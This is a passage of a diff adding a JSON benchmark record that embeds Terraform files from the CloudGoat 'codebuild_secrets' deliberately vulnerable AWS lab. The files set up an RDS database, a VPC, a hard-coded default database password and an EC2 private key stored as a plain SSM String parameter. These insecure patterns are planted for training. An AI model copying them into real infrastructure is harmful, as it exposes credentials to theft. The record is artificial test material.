\"${aws_security_group.cg-rds-security-group.id}\"\n  ]\n  storage_type = \"gp2\"\n  allocated_storage = 20\n  db_name = \"${var.rds-database-name}\"\n  apply_immediately = true\n  skip_final_snapshot = true\n\n  tags = {\n      Name = \"cg-rds-instance-${var.cgid}\"\n      Stack = \"${var.stack-name}\"\n      Scenario = \"${var.scenario-name}\"\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/ssm-parameters.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/ssm-parameters.tf",
+      "member_sha256": "f96c7413e5c3375cd95f45c82bd298b39bac9c672062b8356611051130d8fb18",
+      "bytes": 675,
+      "content_kind": "tf",
+      "text": "#AWS SSM Parameters\nresource \"aws_ssm_parameter\" \"cg-ec2-public-key\" {\n  name = \"cg-ec2-public-key-${var.cgid}\"\n  description = \"cg-ec2-public-key-${var.cgid}\"\n  type = \"String\"\n  value = \"${file(\"../cloudgoat.pub\")}\"\n  tags = {\n    Name = \"cg-ec2-public-key-${var.cgid}\"\n    Stack = \"${var.stack-name}\"\n    Scenario = \"${var.scenario-name}\"\n  }\n}\nresource \"aws_ssm_parameter\" \"cg-ec2-private-key\" {\n  name = \"cg-ec2-private-key-${var.cgid}\"\n  description = \"cg-ec2-private-key-${var.cgid}\"\n  type = \"String\"\n  value = \"${file(\"../cloudgoat\")}\"\n  tags = {\n    Name = \"cg-ec2-private-key-${var.cgid}\"\n    Stack = \"${var.stack-name}\"\n    Scenario = \"${var.scenario-name}\"\n  }\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/variables.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/variables.tf",
+      "member_sha256": "b7b64c09196b244564250d658f935a78345f9fabf6c013c3c26e6f40d0b26c13",
+      "bytes": 1039,
+      "content_kind": "tf",
+      "text": "#Required: AWS Profile\nvariable \"profile\" {\n\n}\n#Required: AWS Region\nvariable \"region\" {\n  default = \"us-east-1\"\n}\n#Required: CGID Variable for unique naming\nvariable \"cgid\" {\n\n}\n#Example: RDS PostgreSQL Instance Credentials\nvariable \"rds-username\" {\n  default = \"cgadmin\"\n}\nvariable \"rds-password\" {\n  default = \"wagrrrrwwgahhhhwwwrrggawwwwwwrr\"\n}\nvariable \"rds-database-name\" {\n  default = \"securedb\"\n}\n#SSH Public Key\nvariable \"ssh-public-key-for-ec2\" {\n  default = \"../cloudgoat.pub\"\n}\n#Required: User's Public IP Address(es)\nvariable \"cg_whitelist\" {\n  default = \"../whitelist.txt\"\n}\n#Stack Name\nvariable \"stack-name\" {\n  default = \"CloudGoat\"\n}\n#Scenario Name\nvariable \"scenario-name\" {\n  default = \"codebuild-secrets\"\n}\n\nlocals {\n  # Ensure the bucket suffix doesn't contain invalid characters\n  # \"Bucket names can consist only of lowercase letters, numbers, dots (.), and hyphens (-).\"\n  # (per https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucketnamingrules.html)\n  cgid_suffix = replace(var.cgid, \"/[^a-z0-9-.]/\", \"-\")\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/vpc.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/vpc.tf",
+      "member_sha256": "cf0271f7270c26550b5629e0b1176286ec30b99fcae6971af36474d18db740b1",
+      "bytes": 3268,
+      "content_kind": "tf",
+      "text": "resource \"aws_vpc\" \"cg-vpc\" {\n  cidr_block = \"10.10.0.0/16\"\n  enable_dns_hostnames = true\n  tags = {\n      Name = \"CloudGoat ${var.cgid} VPC\"\n      Stack = \"${var.stack-name}\"\n      Scenario = \"${var.scenario-name}\"\n  }\n}\n#Internet Gateway\nresource \"aws_internet_gateway\" \"cg-internet-gateway\" {\n  vpc_id = \"${aws_vpc.cg-vpc.id}\"\n  tags = {\n      Name = \"CloudGoat ${var.cgid} Internet Gateway\"\n      Stack = \"${var.stack-name}\"\n      Scenario = \"${var.scenario-name}\"\n  }\n}\n#Public Subnets\nresource \"aws_subnet\" \"cg-public-subnet-1\" {\n  availability_zone = \"${var.region}a\"\n  cidr_block = \"10.10.10.0/24\"\n  vpc_id = \"${aws_vpc.cg-vpc.id}\"\n  tags = {\n      Name = \"CloudGoat ${var.cgid} Public Subnet #1\"\n      Stack = \"${var.stack-name}\"\n      Scenario = \"${var.scenario-name}\"\n  }\n}\nresource \"aws_subnet\" \"cg-public-subnet-2\" {\n  availability_zone = \"${var.region}b\"\n  cidr_block = \"10.10.20.0/24\"\n  vpc_id = \"${aws_vpc.cg-vpc.id}\"\n  tags = {\n      Name = \"CloudGoat ${var.cgid} Public Subnet #2\"\n      Stack = \"${var.stack-name}\"\n      Scenario = \"${var.scenario-name}\"\n  }\n}\n#Private Subnets\nresource \"aws_subnet\" \"cg-private-subnet-1\" {\n  availability_zone = \"${var.region}a\"\n  cidr_block = \"10.10.30.0/24\"\n  vpc_id = \"${aws_vpc.cg-vpc.id}\"\n  tags = {\n      Name = \"CloudGoat ${var.cgid} Private Subnet #1\"\n      Stack = \"${var.stack-name}\"\n      Scenario = \"${var.scenario-name}\"\n  }\n}\nresource \"aws_subnet\" \"cg-private-subnet-2\" {\n  availability_zone = \"${var.region}b\"\n  cidr_block = \"10.10.40.0/24\"\n  vpc_id = \"${aws_vpc.cg-vpc.id}\"\n  tags = {\n      Name = \"CloudGoat ${var.cgid} Private Subnet #2\"\n      Stack = \"${var.stack-name}\"\n      Scenario = \"${var.scenario-name}\"\n  }\n}\n#Public Subnet Routing Table\nresource \"aws_route_table\" \"cg-public-subnet-route-table\" {\n  route {\n      cidr_block = \"0.0.0.0/0\"\n      gateway_id = \"${aws_internet_gateway.cg-internet-gateway.id}\"\n  }\n  vpc_id = \"${aws_vpc.cg-vpc.id}\"\n  tags = {\n      Name = \"CloudGoat ${var.cgid} Route Table for Public Subnet\"\n      Stack = \"${var.stack-name}\"\n      Scenario = \"${var.scenario-name}\"\n  }\n}\n#Private Subnet Routing Table\nresource \"aws_route_table\" \"cg-private-subnet-route-table\" {\n  vpc_id = \"${aws_vpc.cg-vpc.id}\"\n  tags = {\n      Name = \"CloudGoat ${var.cgid} Route Table for Private Subnet\"\n      Stack = \"${var.stack-name}\"\n      Scenario = \"${var.scenario-name}\"\n  }\n}\n#Public Subnets Routing Associations\nresource \"aws_route_table_association\" \"cg-public-subnet-1-route-association\" {\n  subnet_id = \"${aws_subnet.cg-public-subnet-1.id}\"\n  route_table_id = \"${aws_route_table.cg-public-subnet-route-table.id}\"\n}\nresource \"aws_route_table_association\" \"cg-public-subnet-2-route-association\" {\n  subnet_id = \"${aws_subnet.cg-public-subnet-2.id}\"\n  route_table_id = \"${aws_route_table.cg-public-subnet-route-table.id}\"\n}\n#Private Subnets Routing Associations\nresource \"aws_route_table_association\" \"cg-priate-subnet-1-route-association\" {\n  subnet_id = \"${aws_subnet.cg-private-subnet-1.id}\"\n  route_table_id = \"${aws_route_table.cg-private-subnet-route-table.id}\"\n}\nresource \"aws_route_table_association\" \"cg-priate-subnet-2-route-association\" {\n  subnet_id = \"${aws_subnet.cg-private-subnet-2.id}\"\n  route_table_id = \"${aws_route_table.cg-private-subnet-route-table.id}\"\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    }
+  ],
+  "runtime_instances": [],
+  "source_context_fields": [
+    "candidate_metadata",
+    "runtime_instances",
+    "source",
+    "source_materials"
+  ],
+  "source_context_sha256": "5a63ec02ed5a6c84f3d999bb6dea4fd0fdc55c8688895789d5c0f8df358f512b",
+  "admission_screen": {
+    "external_or_low_privilege_entry_defined": null,
+    "multi_step_path_present": null,
+    "cloud_data_target_present": null,
+    "critical_edges_have_raw_evidence": null,
+    "not_a_near_duplicate": null,
+    "decision": null,
+    "rationale": null
+  },
+  "nodes": [],
+  "edges": [],
+  "path_labels": [],
+  "tool_tasks": [],
+  "instance_labels": []
+}
